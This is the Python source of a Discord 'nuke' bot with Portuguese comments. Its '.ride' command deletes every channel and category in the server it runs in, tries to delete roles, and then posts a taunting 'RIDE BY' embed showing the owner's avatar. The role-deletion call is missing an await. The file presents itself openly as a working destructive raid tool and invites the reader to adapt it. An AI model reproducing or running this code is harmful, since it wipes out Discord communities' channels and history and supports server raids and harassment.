import discord
from discord.ext import commands

intents = discord.Intents.all()
bot = commands.Bot('.', intents=intents)
@bot.event
async def on_ready():
   print("iniciado")
# Mude as coisas no código para fazer funcionar do seu jeito


@bot.command()
async def ride(ctx:commands.Context):
    appinfo = await bot.application_info()
    owner = appinfo.owner

    embed = discord.Embed(title='RIDE por ', color=discord.Color.red(), description="cry")
    embed.set_image(url = owner.avatar.url)

    categorias = ctx.guild.categories
    cargos = ctx.guild.roles

    try:
        for categoria in categorias:
            for canal in categoria.channels:
                 await canal.delete()
            await categoria.delete()
    except:
        print("erro")
    

    for cargo in cargos:
         if cargo == ctx.guild.default_role:
            continue  # pula @everyone
         if cargo.managed:
            continue  # pula cargos gerenciados por bots/integrations
         if cargo >= ctx.guild.me.top_role:
            continue  # só deleta cargos abaixo do bot na hierarquia
         try:
            cargo.delete()

         except:
            print("Erro ao deletar os cargos")
    
    CategoriaDoFinal = await ctx.guild.create_category("RIDE BY ")
    CanalFinal = await ctx.guild.create_text_channel("", category=CategoriaDoFinal)

    await CanalFinal.send(embed=embed)


bot.run('')
